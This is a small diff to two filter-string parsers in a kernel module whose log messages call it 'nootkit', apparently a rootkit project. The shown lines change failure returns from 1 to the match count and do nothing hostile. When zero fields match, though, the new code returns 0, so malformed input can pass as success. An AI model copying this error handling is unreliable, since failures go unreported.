@@ -38,7 +38,7 @@ int config_parse_socket_filter(char *cs, struct config_netfilter *res)
     if (matches != SOCKET_STR_FIELDS) {
         printk(KERN_ERR "nootkit: Invalid socket filter string [%s], only %d fields matched",
             cs, matches);
-        return 1;
+        return matches;
     }
 
     memset(res, 0, sizeof(*res));
@@ -91,7 +91,7 @@ int config_parse_packet_filter(char *cs, struct config_netfilter *res)
     if (matches != PACKET_STR_FIELDS) {
         printk(KERN_ERR "nootkit: Invalid packet filter string [%s], only %d fields matched",
             cs, matches);
-        return 1;
+        return matches;
     }
 
     memset(res, 0, sizeof(*res));
